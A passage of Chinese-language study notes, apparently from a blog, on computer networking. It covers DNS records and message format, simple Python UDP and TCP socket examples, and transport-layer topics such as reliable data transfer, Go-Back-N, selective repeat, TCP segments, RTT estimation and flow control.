<li><strong>权威DNS服务器</strong>：在因特网上具有公共可访问主机的每个机构必须提供公共可访问的DNS记录，这些记录将这些主机的名字映射为IP地址。一个组织机构的权威DNS收藏了这些DNS记录。</li>
</ul>
</li>
</ul>
<p><img src="/2021/05/cnatda-1/image-20210508203109038.png" alt="image-20210508203109038"></p>
<ul>
<li>
<p>本地DNS服务器：严格来说不属于DNS服务器的层次结构。本地服务器起着代理的作用，将DNS请求转发到DNS服务器层次结构中。</p>
<p>DNS查询分为两种：<strong>递归查询</strong>和<strong>迭代查询</strong>。</p>
<ul>
<li>
<p>迭代查询</p>
<p><img src="/2021/05/cnatda-1/image-20210508204520770.png" alt="image-20210508204520770"></p>
</li>
<li>
<p>递归查询</p>
<p><img src="/2021/05/cnatda-1/image-20210508204559893.png" alt="image-20210508204559893"></p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>DNS缓存</p>
<ul>
<li>
<p>原理：当某DNS服务器接收一个DNS回答时，DNS缓存能将映射缓存在本地存储器中。</p>
<p>如果在DNS服务器中缓存了一台主机/IP地址对，另一个对相同主机名的查询到达该DNS服务器时，该DNS服务器就能提供所要求的IP地址，即使它不是该主机名的权威服务器。</p>
</li>
<li>
<p>由于主机和主机名与IP地址间的映射并不是永久的，DNS服务器在一段时间后将丢弃缓存的信息。</p>
</li>
<li>
<p>本地DNS服务器也能够缓存TLD服务器的IP地址，因而允许本地DNS绕过查询链中的根DNS服务器。因为缓存的存在，除了少数DNS查询以外，<strong>根服务器</strong>被绕过了。</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>DNS记录和报文</p>
<ul>
<li>
<p>共同实现DNS分布式数据库的所有DNS服务器存储了<strong>资源记录（Resource Recode, RR）</strong>,其中提供了主机名到IP地址的映射。每个DNS回答报文中包含了一条或多条的资源记录。</p>
</li>
<li>
<p>资源记录是一个包含了下列字段的4元组：<strong>(Name, Value, Type, TTL)</strong></p>
<p>其中，TTL是该记录的生存时间，决定了<strong>资源记录应当从缓存中删除的时间</strong>。</p>
<p>Name和Value的值取决于Type：</p>
<ul>
<li>
<p>如果Type = A，则 Name 是主机名， Value 是该主机名对应的IP地址。即一条类型为A的资源记录提供了标准的主机名到IP地址的映射。例如 <strong>(<a href="http://relay1.bar.foo.com" target="_blank" rel="noopener">relay1.bar.foo.com</a>, 145.37.93.126, A)</strong></p>
</li>
<li>
<p>如果Type = NS，则 Name 是一个域（例如<code>foo.com</code>），而 Value 是个知道如何获取该域中主机IP地址的权威DNS服务器的主机名。这个记录用于沿着查询链来路由DNS查询。例如 <strong>(<a href="http://foo.com" target="_blank" rel="noopener">foo.com</a>, <a href="http://dns.foo.com" target="_blank" rel="noopener">dns.foo.com</a>, NS)</strong></p>
</li>
<li>
<p>如果 Type = CNAME，则 Value 是个别名为 Name 的主机对应的规范主机名。该记录能够向查询的主机提供一个主机名对应的规范主机名。例如 <strong>(<a href="http://foo.com" target="_blank" rel="noopener">foo.com</a>, <a href="http://relay1.bar.foo.com" target="_blank" rel="noopener">relay1.bar.foo.com</a>, CNAME)</strong></p>
</li>
<li>
<p>如果Type = MX，则 Value 是个别名为 Name 的<strong>邮件服务器的规范主机名</strong>。例如 <strong>(<a href="http://foo.com" target="_blank" rel="noopener">foo.com</a>, <a href="http://mail.bar.foo.com" target="_blank" rel="noopener">mail.bar.foo.com</a>, MX)</strong>。MX记录允许邮件服务器主机名具有简单的别名。</p>
<blockquote>
<p>注意：通过MX记录，一个公司的邮件服务器和其他服务器（例如Web服务器）可以使用<strong>相同的别名</strong>。为了获取邮件服务器的规范主机名，DNS客户应该请求一条MX记录；而为了获取其他服务器的规范主机名，应该请求CNAME记录。</p>
</blockquote>
</li>
</ul>
<p>如果一台DNS服务用于某特定主机名的<strong>权威DNS服务器</strong>，那么该DNS服务器会有一条<strong>包含用于该主机名的类型A记录</strong>。</p>
<p>如果服务器不是用于某主机名的权威DNS服务器，那么该服务器将<strong>包含一条类型NS记录</strong>，该记录对应于包含主机名的域；同时还将<strong>包括一条类型A记录</strong>，提供<strong>在NS记录的Value字段中的DNS服务器的IP地址</strong>。</p>
</li>
<li>
<p>DNS报文格式如下，只有查询和回答两种报文，并且格式相同：</p>
<p><img src="/2021/05/cnatda-1/image-20210509000647692.png" alt="image-20210509000647692"></p>
<ul>
<li>前12个字节是<strong>首部区域</strong>，其中有几个字段。
<ul>
<li>第一个字段（标识符）是一个16比特的数，用于标识该查询。该标识符会被复制到对查询的回答报文中，以便让客户用它来匹配发送的请求和接收到的回答。</li>
<li>标志字段中含有若干标志。
<ul>
<li>1比特的 <strong>“查询/回答”</strong> 标志位指出报文是 <strong>查询报文0</strong> 还是 <strong>回答报文1</strong> 。</li>
<li>当某DNS服务器是所请求名字的权威DNS服务器时，1比特的 <strong>“权威的”</strong> 标志位将会被置在回答报文中。</li>
<li>如果客户在该DNS服务器没有某记录时，希望它执行<strong>递归</strong>查询，将设置1比特的 <strong>“希望递归”</strong> 标志位。如果该DNS服务器支持递归查询，则在回答报文中会对1比特的 <strong>“递归可用”</strong> 标志位置位。</li>
</ul>
</li>
</ul>
</li>
<li><strong>问题区域</strong>包含着正在进行的查询信息。其中，该区域包括
<ul>
<li>名字字段，包含正在被查询的主机名字</li>
<li>类型字段，指出有关该名字的正被询问的问题类型，例如主机地址是与一个名字相关联（类型A）还是与某个名字的邮件服务器相关联（类型MX）。</li>
</ul>
</li>
<li>在来自DNS服务器的回答中，<strong>回答区域</strong>包含了对最初请求的名字的资源记录。回答报文中的回答区域可以包含多条RR，因此<strong>一个主机名能够有多个IP地址，例如负载均衡</strong>。</li>
<li><strong>权威区域</strong>包含了其他权威服务器的记录。</li>
<li><strong>附加区域</strong>包含了其他有帮助的记录。例如对于一个MX请求的回答报文的回答区域包含了一条资源记录，提供了邮件服务器的规范主机名。而附加区域中<strong>包含了一个类型A记录</strong>，提供<strong>用于该邮件服务器的规范主机名的IP地址</strong>。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-套接字编程">3. 套接字编程</h3>
<h4 id="a-UDP编程">a. UDP编程</h4>
<p><img src="/2021/05/cnatda-1/image-20210508165739385.png" alt="image-20210508165739385"></p>
<ul>
<li>
<p><code>UDPClient.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverName = <span class="string">'hostname'</span></span><br><span class="line">serverPort = <span class="number">12000</span></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">message = raw_input(<span class="string">'Input lowercase sentence:'</span>)</span><br><span class="line">clientSocket.sendto(message.encode(), (serverName, serverPort))</span><br><span class="line">modifiedMessage, serverAddress = clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line">print(modifiedMessage.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>UDPServer.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverPort = <span class="number">12000</span></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line">serverSocket.bind((<span class="string">''</span>, serverPort))</span><br><span class="line">print(<span class="string">"The server is ready to receive"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    message, clientAddress = serverSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line">    modifiedMessage = message.decode().upper()</span><br><span class="line">    serverSocket.sendto(modifiedMessage.encode(), clientAddress)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="b-TCP编程">b. TCP编程</h4>
<p><img src="/2021/05/cnatda-1/image-20210508165807956.png" alt="image-20210508165807956"></p>
<ul>
<li>
<p><code>TCPClient.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverName = <span class="string">'servername'</span></span><br><span class="line">serverPort = <span class="number">12000</span></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">clientSocket.connect((serverName, serverPort))</span><br><span class="line">sentence = raw_input(<span class="string">'Input lowercase sentence:'</span>)</span><br><span class="line">clientSocket.send(sentence.encode())</span><br><span class="line">modifiedSentence = clientSocket.recvfrom(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">'From Server: '</span>, modifiedSentence.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>TCPServer.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverPort = <span class="number">12000</span></span><br><span class="line">serverSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">serverSocket.bind((<span class="string">''</span>, serverPort))</span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">"The server is ready to receive"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    connectionSocket, addr = serverSocket.accept()</span><br><span class="line">    sentence = connectionSocket.recvfrom(<span class="number">1024</span>).decode()</span><br><span class="line">    capitalizedSentence = sentence.upper()</span><br><span class="line">    connectionSocket.send(capitalizedSentence.encode())</span><br><span class="line">    connectionSocket.close()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="第三章：运输层">第三章：运输层</h2>
<h3 id="1-简述">1. 简述</h3>
<ul>
<li>
<p>运输层协议为运行在不同主机上的应用进程之间提供了<strong>逻辑通信logic communication</strong>功能。从应用程序的角度来看，通过逻辑通信，运行不同进程的主机好像直接相连一样。</p>
</li>
<li>
<p>TCP和UDP是运输层协议中的一种，但运输层协议<strong>不是只有这两种</strong>。</p>
</li>
<li>
<p>将运输层TCP/UDP分组称为<strong>报文段segment</strong>，将网络层分组称为<strong>数据报datagram</strong>。</p>
</li>
<li>
<p>因特网网络层协议中有一个协议为<strong>网际协议IP</strong>，其服务模型是<strong>尽力而为交付服务</strong>，称为<strong>不可靠服务</strong>。每台主机至少有一个网络层地址，即IP地址。</p>
</li>
<li>
<p>将主机间交付扩展到进程间交付被称为<strong>运输层的多路复用与多路分解</strong>。</p>
<ul>
<li>
<p>将运输层报文段中的数据交付到正确的套接字的工作称为<strong>多路分解</strong>。</p>
</li>
<li>
<p>从不同套接字中收集数据块、为每个数据块封装上首部信息，以生成报文段，并最终传递到网络层。这些工作统称为<strong>多路复用</strong>。</p>
</li>
<li>
<p>运输层多路复用要求</p>
<ul>
<li>套接字有唯一标识符。</li>
<li>每个报文段有特殊字段来指示该报文段索要交付到的套接字。通常这些字段包含<strong>源端口号字段</strong>和<strong>目的端口号字段</strong>（还有一些其他字段）。</li>
</ul>
</li>
<li>
<p>运输层实现分解服务的过程</p>
<ul>
<li>当报文到达主机时，运输层检查报文段中的目的端口号，并将其定向到相应的套接字。</li>
<li>报文段中的数据通过套接字进入其所连接的进程。</li>
</ul>
</li>
<li>
<p><strong>无连接</strong>的多路复用与多路分解</p>
<p>一个UDP套接字是由一个<strong>二元组</strong>全面标识，该二元组包含一个<strong>目的IP地址</strong>和一个<strong>目的端口号</strong>。</p>
<p>因此如果两个UDP报文段有不同的源IP地址/源端口号，但具有相同的目的IP地址和目的端口号，则两个报文段将通过相同的目的套接字被定向到相同的目的进程。</p>
</li>
<li>
<p><strong>面向连接</strong>的多路复用与多路分解</p>
<p>一个TCP套接字是由一个 <strong>四元组（源IP地址，源端口号，目的IP地址，目的端口号）</strong> 来标识。</p>
<p>两个具有不同源IP地址或源端口号的到达TCP报文段将被定向到两个不同的套接字。</p>
</li>
</ul>
</li>
</ul>
<h3 id="2-无连接运输：UDP">2. 无连接运输：<strong>UDP</strong></h3>
<ul>
<li>
<p>UDP优点</p>
<ul>
<li><strong>关于发送什么数据以及何时发送的应用层控制更为精细</strong>。与TCP的拥塞控制机制相反，UDP会<strong>立即</strong>将应用层的数据打包并<strong>立即</strong>传递给网络层。</li>
<li><strong>无需连接建立</strong>。UDP无需三次握手，不需要任何准备即可进行数据传输，因此不会引入建立连接的时延。</li>
<li><strong>无连接状态</strong>。TCP需要在端系统中维护连接状态，此连接状态中包括接受和发送缓存、拥塞控制参数以及序号与确认号的参数。而UDP不维护连接状态，因此不跟踪这些参数，就可以支持更多活跃客户。</li>
<li><strong>分组首部开销小</strong>。每个TCP报文段都有20字节的首部开销，而UDP仅有8字节的开销。</li>
</ul>
</li>
<li>
<p>UDP报文段结构</p>
<p><img src="/2021/05/cnatda-1/image-20210508163648687.png" alt="image-20210508163648687"></p>
</li>
<li>
<p>UDP提供差错检测功能：发送方的UDP对报文段中的所有16比特字的<strong>和</strong>进行<strong>反码运算</strong>。求和时遇到的任何溢出都将被回卷。得到的结果被放在UDP报文段中的检验和字段。</p>
<blockquote>
<p>回卷：把溢出的最高位1和低16位做加法运算。</p>
</blockquote>
<p>这样，接收方将全部的16比特字相加，如果分组没有引入差错，则在接收方处该和将为1111111111111111。如果存在任意一个位置的比特为0，则说明该分组中出现差错。</p>
</li>
</ul>
<h3 id="3-可靠数据传输">3. 可靠数据传输</h3>
<h4 id="1-构建可靠传输数据协议">1. 构建可靠传输数据协议</h4>
<ul>
<li>
<p><strong>可靠数据传输</strong>为上层实体提供的服务抽象是：数据可以通过一条可靠的信道进行传输。借助于可靠信道，传输数据比特就不会不会受到损坏或丢失，并且所有数据都是按照其发送顺序进行交互。</p>
<p>实现这种服务抽象是<strong>可靠数据传输协议</strong>的责任，但通常该协议的<strong>下层</strong>协议是<strong>不可靠</strong>的，因此任务较为复杂。</p>
<blockquote>
<p>例如：TCP是在不可靠的（IP）端到端网络层之上实现的可靠数据传输协议。</p>
</blockquote>
</li>
<li>
<p>底层信道在分组的传输或缓存的过程中，可能会产生比特差错。当检测到这类错误时，发送方需要重传对应的分组，并等待接收方发送<strong>肯定确认</strong>或<strong>否定确认</strong>的控制报文。这些控制报文使得接收方可以让发送方知道哪些内容被正确接收，那些内容接收有误并因此需要重复。在计算机网络中，基于这样<strong>重传机制</strong>的<strong>可靠数据传输协议</strong>称为<strong>自动重传请求（Automatic Repeat reQuest, ARQ）</strong>。</p>
<p>更重要的是，ARQ协议还需要另外三种协议功能来处理存在比特差错的情况：</p>
<ul>
<li><strong>差错检测</strong>。需要一种机制以使接收方检测到何时出现了比特差错。这里使用<strong>比特校验技术</strong>（想想UDP校验）。</li>
<li><strong>接收方反馈</strong>。由于发送方和接收方通常在不同的端系统上运行，因此发送方要了解接收方情况的唯一途径是<strong>让接收方提供明确的反馈信息给发送方</strong>。口述报文中的<strong>肯定确认ACK</strong>和<strong>否定确认NAK</strong>就是这种反馈的例子。</li>
<li><strong>重传</strong>。接收方收到有差错的分组时，发送方将重传该分组文。</li>
</ul>
<p>需要注意的是，接收方返回的 ACK/NAK 报文同样有受损或丢包的风险。当发送方收到含糊的 ACK/NAK 分组时，只需重传分组即可，但这会在信道中引入<strong>冗余分组</strong>。冗余分组的困难点在于，接收方无法<strong>事先</strong>知道接收到的分组是新的还是一次重传。</p>
<p>解决这个问题的一个简单方法是：在数据分组中添加一新字段，让发送方对其数据分组编号，即将发送数据分组的<strong>序号</strong>放在该字段，之后接收方只需检查序号即可确定收到的分组是否是一次重传。</p>
</li>
<li>
<p>除了比特受损以外，底层信道还会丢包。因此可靠数据传输协议必须处理另外两个问题：<strong>如何检测丢包</strong> &amp; <strong>发送丢包后该做什么</strong>。根据上文，我们可以很容易的给出后一个问题的答案——<strong>重传</strong>。但对于第一个<strong>如何检测丢包</strong>，我们需要进一步的研究一下。</p>
<p>发送方等待足够长的时间以<strong>确定</strong>分组是否已经丢失。实践中发送方根据特定算法选择一个时间值，以<strong>判定</strong>是否丢包（注意是<strong>判定</strong>不是<strong>确保</strong>）。如果在这个时间内没有收到ACK则重传该分组。</p>
<blockquote>
<p>需要注意的是，如果一个分组经历特别大的时延，发送方就可能重新发送该分组，即便原分组和其ACK都没有丢失。而这种情况就引入了<strong>冗余数据分组</strong>。</p>
</blockquote>
<p>为了实现基于时间的重传机制，需要一个<strong>倒计时定时器</strong>，在一个给定的时间量过期后，中断发送方，使其重传。</p>
</li>
<li>
<p>最终，实现的可靠传输数据协议的状态机图如下所示：</p>
<p><img src="/2021/05/cnatda-1/image-20210514200231320.png" alt="image-20210514200231320"></p>
<p>这里同样有一个图说明运行时可能产生的各类情况:</p>
<p><img src="/2021/05/cnatda-1/image-20210514200835917.png" alt="image-20210514200835917"></p>
<p>在<strong>检验和</strong>、<strong>序号</strong>、<strong>定时器</strong>、<strong>肯定和否定确认分组</strong>这些技术中，每种机制都在可靠传输协议的运行中起到了必不可少的作用，至此组合而成一个<strong>可靠传输数据协议</strong>。</p>
</li>
</ul>
<h4 id="2-流水线可靠传输数据协议">2. 流水线可靠传输数据协议</h4>
<p>上文中所实现的可靠传输数据协议是一个<strong>停等</strong>协议，即只有确保<strong>接收方正常接受当前分组</strong>后，才会继续发送下一个分组。停等协议的性能极其低下，并且其信道利用率也非常的低，故<strong>允许发送方发送多个分组而无需等待确认</strong>是一个必然的选择。</p>
<p>由于许多从发送方向接收方输送的分组可以被看做是填充到一条流水线中，因此该技术称为<strong>流水线</strong>。流水线技术对可靠数据传输协议带来的影响如下：</p>
<ul>
<li>必须增加序号范围。因为每个输送中的分组必须有一个唯一的序号，并且或许有多个在输送中的未确认报文。</li>
<li>协议中的发送方和接收方两端也许不得不缓存多个分组。发送方至少要缓存那些已发送但没有确认的分组；接收方需要缓存那些已正确接受的分组。</li>
<li>所需序号范围和对缓冲的要求取决于数据传输协议如何处理丢失、损坏以及延时过大的分组。</li>
</ul>
<p>对于流水线的差错恢复有两种基本方法：<strong>回退N步（Go-Back-N, GBN）<strong>和</strong>选择重传（Selective Repeat, SR）</strong>。</p>
<h5 id="1-回退N步">1) 回退N步</h5>
<p>回退N步协议允许发送方发送多个分组而不需等待确认，但受限于在流水线中未确认的分组数不能超过某个最大允许数N。以下显示了发送方看到的GBN协议的序号范围：</p>
<blockquote>
<p>基序号：最早未确认分组的序号</p>
<p>下一个序号：最小未使用序号</p>
<p>N常被称为窗口长度，因此GBN协议称为滑动窗口协议。</p>
</blockquote>
<ul>
<li>$[0, base-1]$：已经发送并被确认的分组</li>
<li>$[base, nextseqnum-1]$：已经发送但未被确认的分组</li>
<li>$[nextseqnum, base+N-1]$：用于那些要被立即发送的分组</li>
<li>$[base+N, \infty)$：暂时不能被使用，直到移动窗口。</li>
</ul>
<p><img src="/2021/05/cnatda-1/image-20210514202515628.png" alt="image-20210514202515628"></p>
<p>GBN的发送方必须响应三种类型的事件：</p>
<ul>
<li><strong>上层调用</strong>。当上层调用 rdt_send 时，发送方首先检查发送窗口是否已满，如果未满则产生一个分组并发送。如果窗口已满则隐式指示上层该窗口已满。</li>
<li><strong>收到一个ACK</strong>。GBN协议中，对序号为n的分组的确认采取<strong>累计确认</strong>方式，表示接收方已正确接收到<strong>序号为n的以前且包括n在内</strong>的所有分组。</li>
<li><strong>超时事件</strong>。定时器用于恢复数据或确认分组的丢失。如果出现超时，则发送方重传<strong>所有已发送但还未被确认过</strong>的分组。</li>
</ul>
<p>GBN的接收方动作较为简单：如果一个序号为n的分组被正确接收到，并且按序，则接收方为n发送一个ACK，并将该分组中的数据部分交付到上层。其他情况下则<strong>丢弃该部分</strong>并为<strong>最近按序接收的分组</strong>重新发送ACK。</p>
<p>以下是一个运行中的GBN流程图：</p>
<p><img src="/2021/05/cnatda-1/image-20210514204430755.png" alt="image-20210514204430755"></p>
<h5 id="2-选择重传">2) 选择重传</h5>
<p>GBN协议可能会重传许多<strong>本没必要重传的分组</strong>，从而影响性能。SR协议通过让发送方仅重传那些<strong>它怀疑在接收方出错的分组</strong>，从而避免了不必要的重传。这种个别的、按需的重传要求接收方<strong>逐个的确认</strong>正确接收的分组。</p>
<p>SR协议同样使用窗口长度N来限制流水线中未完成、未被确认的分组数。但与GBN不同的是，发送方已经收到了对窗口中某些分组的ACK。</p>
<p><img src="/2021/05/cnatda-1/image-20210514205328078.png" alt="image-20210514205328078"></p>
<p>SR接收方将确认一个正确接收的分组而不管其是否<strong>按序</strong>。失序的分组将被<strong>缓存</strong>直到所有的丢失分组全被收到为止，此时才可以将一批分组按需交付给上层。需要注意的是：接收方会<strong>重新确认</strong>（而不是<strong>忽略</strong>）已收到过的那些<strong>序号小于当前窗口基序号</strong>的分组，因为<strong>发送方和接收方的窗口不总是一致</strong>。</p>
<p>以下是出现丢包时SR操作的简单例子：</p>
<p><img src="/2021/05/cnatda-1/image-20210514205526638.png" alt="image-20210514205526638"></p>
<h4 id="3-可靠数据传输机制及其用途的总结">3. 可靠数据传输机制及其用途的总结</h4>
<ul>
<li><strong>检验和</strong>：用于检测在一个传输分组中的比特错误。</li>
<li><strong>定时器</strong>：用于超时/重传一个分组。</li>
<li><strong>序号</strong>：用于为从发送方流向接收方的数据分组按顺序进行编号。</li>
<li><strong>确认</strong>：接收方用于告诉发送方一个分组或一组分组已被正确的接收到了。</li>
<li><strong>否定确认</strong>：接收方用于告诉发送方某个分组未被正确的接收。</li>
<li><strong>窗口、流水线</strong>：发送方也许被限制仅发送那些序号落在一个指定范围内的分组。</li>
</ul>
<h3 id="4-面向连接的运输：TCP">4. 面向连接的运输：TCP</h3>
<ul>
<li>
<p>TCP被称为是面向连接的，因为在一个应用进程可以开始向另一个应用进程发送数据之前，这两个进程必须先相互发送某些预备报文段，以建立确保数据传输的参数，<strong>这个过程称为握手</strong>。连接的双方都将初始化与TCP连接相关的许多TCP状态变量。</p>
<blockquote>
<p>注意：TCP的连接，是一条逻辑连接，共同状态仅保留在两个通信端系统的TCP程序中。中间的网络元素不会维持TCP连接状态，它们看到的只是数据报，而不是连接。</p>
</blockquote>
<p>同时TCP还是<strong>全双工、点对点</strong>服务。</p>
</li>
<li>
<p>TCP 可从发送缓存中取出并放入报文段中的数据数量受限于<strong>最大报文段长度（Maximum Segment Size， MSS）</strong>。而MSS通常根据最初确定的由本地发送主机发送的<strong>最大链路层帧长度</strong>（即<strong>最大传输单元Maximum Transmission Unit, MTU</strong>）来设置。设置该MSS要保证<strong>一个TCP报文段加上TCP/IP首部长度</strong>将适合单个链路层帧。</p>
</li>
</ul>
<h4 id="a-TCP报文段结构">a. TCP<strong>报文段结构</strong></h4>
<p><img src="/2021/05/cnatda-1/image-20210514212456035.png" alt="image-20210514212456035"></p>
<ul>
<li>
<p><strong>源端口号</strong>和<strong>目标端口号</strong>：用于多路复用/分解来自或送到上层应用的数据。</p>
</li>
<li>
<p>32bit的<strong>序号</strong>字段和32bit的<strong>确认号</strong>字段。</p>
</li>
<li>
<p>16bit的<strong>接收窗口</strong>字段：用于流量控制，表示接收方愿意接受的字节数量。</p>
</li>
<li>
<p>4bit的<strong>首部长度</strong>字段：表示以32bit为单位的TCP首部长度。由于TCP选项字段的原因，TCP首部的长度是可变的。（通常情况下，选项字段为空，因此TCP首部的典型长度为20字节）。</p>
</li>
<li>
<p>可选与变长的<strong>选项字段</strong>。</p>
</li>
<li>
<p>6bit的<strong>标志</strong>字段</p>
<ul>
<li>ACK: 指示确认字段中的值是有效的。</li>
<li>RST、SYN、FIN：用于连接与拆除。</li>
<li>CWR、ECE：明确拥塞通告中使用。</li>
<li>PSH：表示接收方应该<strong>立即将数据交给上层</strong>。</li>
<li>URG：表示报文段里存在着被发送端的上层实体置为<strong>紧急</strong>的数据。紧急数据的最后一个字节由16bit的紧急数据指针字段指出。当紧急数据存在并给出指向紧急数据尾指针的时候，TCP必须通知接收端的上层实体。</li>
</ul>
<blockquote>
<p>在实践中，PSH、URG和紧急数据指针并没有使用。</p>
</blockquote>
</li>
</ul>
<h4 id="b-序号和确认号">b. 序号和确认号</h4>
<ul>
<li>
<p>序号：TCP把数据看成一个<strong>无结构有序</strong>的字节流。序号建立在<strong>传送的字节流</strong>之上，而<strong>不是</strong>建立在传送的报文段的序列之上。因此<strong>一个报文段的序号是该报文段首字节的字节流编号</strong>。</p>
<p><img src="/2021/05/cnatda-1/image-20210514213733944.png" alt="image-20210514213733944"></p>
</li>
<li>
<p>确认号：TCP是全双工的，因此主机A在向主机B发送数据的同时，也可能会受到来自主机B的数据。从主机B到达的每个报文段中都有一个序号用于从B流向A的数据。<strong>主机A填写进报文段的确认号是主机A期望从主机B受到的下一字节的序号。</strong></p>
<p>因为TCP只确认该流中至第一个丢失字节为止的字节，因此TCP被称为提供<strong>累计确认</strong>。若TCP收到乱序的报文段时，实践中最常用的做法是<strong>接收方保留失序的字节</strong>，并等待缺少的字节以填补该间隔。</p>
</li>
<li>
<p>一个简单例子如下所示：</p>
<p><img src="/2021/05/cnatda-1/image-20210514215113475.png" alt="image-20210514215113475"></p>
</li>
</ul>
<h4 id="c-往返时间的估计与超时">c. 往返时间的估计与超时</h4>
<ul>
<li>
<p>TCP使用超时/重传机制来处理报文段的丢失问题。<strong>超时时间间隔长度</strong>必须大于该连接的<strong>往返时间(RTT)</strong>，即从一个报文段发出到它被确认的时间，否则会造成不必要的重传。</p>
</li>
<li>
<p>估计往返时间</p>
<ul>
<li>
<p>报文段的<strong>样本RTT</strong>（这里表示为SampleRTT）就是从某报文被发出到对该报文段的确认被收到之间的时间量。大多数TCP的实现仅在某个时刻做一次SampleRTT测量，而不会为每次发送的报文段测量一个SampleRTT。</p>
</li>
<li>
<p>TCP维持一个 SampleRTT 均值（称为 EstimatedRTT），一旦获得一个新 SampleRTT 时，TCP就会根据下列公式来更新 EstimatedRTT：</p>
<p>$EstimatedRTT = (1 - \alpha) * EstimatedRTT + \alpha* SampleRTT$</p>
<blockquote>
<p>RFC 6298 中给出的 alpha 推荐值为 0.125。</p>
</blockquote>
</li>
<li>
<p>除了估算 RTT外，测量RTT的变化也是有价值的。RFC6298定义了RTT偏差 DevRTT，用于估算SampleRTT 一般会偏离 EstimatedRTT 的程度：</p>
<p>$DevRTT = (1 - \beta) * DevRTT + \beta * |SampleRTT - EstimatedRTT|$</p>
</li>
</ul>
</li>
<li>
<p>设置和管理重传超时间隔</p>
<p>在TCP的确定重传超时间隔的方法中，EstimatedRTT 和 DevRTT 考虑到了显示的情况，因此最终的间隔为：$TimeoutInterval = EstimatedRTT + 4 * DevRTT$</p>
<blockquote>
<p>推荐初始的TimeoutInterval的值为1s。</p>
</blockquote>
</li>
</ul>
<h4 id="d-可靠数据传输">d. 可靠数据传输</h4>
<ul>
<li>
<p><strong>实现机制</strong>：该部分中具体实现机制的大部分细节与上文中的<strong>可靠数据传输协议</strong>相同。</p>
</li>
<li>
<p><strong>超时间隔加倍</strong>：每次TCP重传时都会将下一次的超时间隔设为先前值的两倍，而不是由EstimatedRTT和DevRTT推断出的值。</p>
</li>
<li>
<p><strong>快速重传</strong>：</p>
<ul>
<li><strong>冗余ACK的生成过程</strong>：当TCP接收方检测到了数据流中的间隔时（该间隔可能是报文段丢失或重新排序造成），它只会对已经接收到的最后一个按序字节数据进行重复确认（即产生一个冗余ACK）。</li>
<li><strong>验证丢包原因</strong>：由于发送方经常发送大量的报文段，如果一个报文段丢失则很有可能引发大量冗余ACK。如果TCP发送方接收到对相同数据的<strong>3个</strong>冗余ACK，则说明跟在这个已被确认过3次的报文段之后的报文段已经丢失。此时执行<strong>快速重传</strong>，在报文段定时器过期<strong>之前</strong>重传丢失的报文段。</li>
</ul>
</li>
<li>
<p>TCP差错恢复机制</p>
<ul>
<li>
<p>TCP确认是累计式的，正确接收但失序的报文段是<strong>不会</strong>被接收方<strong>逐个确认</strong>。</p>
<blockquote>
<p>注意：不会被逐个确认<strong>不代表</strong>会被丢弃。</p>
</blockquote>
</li>
<li>
<p>TCP发送方仅需维持<strong>已发送过但未被确认的字节的最小序号</strong>和<strong>下一个要发送的字节的序号</strong>。</p>
</li>
<li>
<p>许多TCP实现会将正确接收但失序的报文段<strong>缓存</strong>起来。</p>
</li>
<li>
<p>对TCP提出的修改意见是<strong>选择确认</strong>。它允许TCP接收方有选择地确认失序报文段，而不是累计地确认最后一个正确接收的有序报文段。</p>
</li>
</ul>
<blockquote>
<p>TCP的差错恢复机制是 GBN协议和SR协议的混合体。</p>
</blockquote>
</li>
</ul>
<h4 id="e-流量控制">e. 流量控制</h4>
<ul>
<li>
<p>TCP为应用程序提供<strong>流量控制</strong>服务以消除发送方使接收方缓存溢出的可能性。</p>
</li>
<li>
<p>TCP发送方也可能因为IP网络的拥塞而被设置，这种形式的发送方的控制被称为<strong>拥塞控制</strong>。</p>
<blockquote>
<p>注意：拥塞控制和流量控制不同，需要区分开来。</p>
</blockquote>
</li>
<li>
<p>TCP通过让<strong>发送方</strong>维护一个称为<strong>接收窗口</strong>的变量来提供流量控制。接受窗口用于告诉<strong>发送方</strong>，<strong>当前接收方</strong>还有多少可用的缓存空间。TCP是全双工通信，在连接两端的发送方都各自维护一个接收窗口。</p>
<p><img src="/2021/05/cnatda-1/image-20210515000223929.png" alt="image-20210515000223929"></p>
<p>假设主机A通过一条TCP连接向主机B发送一个大文件。则主机B通过把当前的 <strong>接收窗口rwnd</strong> 值放入它发给主机A的报文段<strong>接收窗口字段</strong>中，通知主机A在该连接的缓存中还有多少可用空间。</p>
</li>
<li>
<p>还有一个问题：假设主机B的接收缓存已满，使得 rwnd = 0，并且主机B没有任何数据要发给主机A（这种假设是为了确保主机AB之间<strong>没有任何的分组通信</strong>）。则因为主机B上的应用进程清空缓存时，TCP不会向主机A发送带有 rwnd 新值的新报文段，这样就会使得<strong>主机A无法知道主机B的接收缓存已经有新的空间了</strong>。因此<strong>主机A将会被阻塞，而无法再发送数据</strong>。</p>
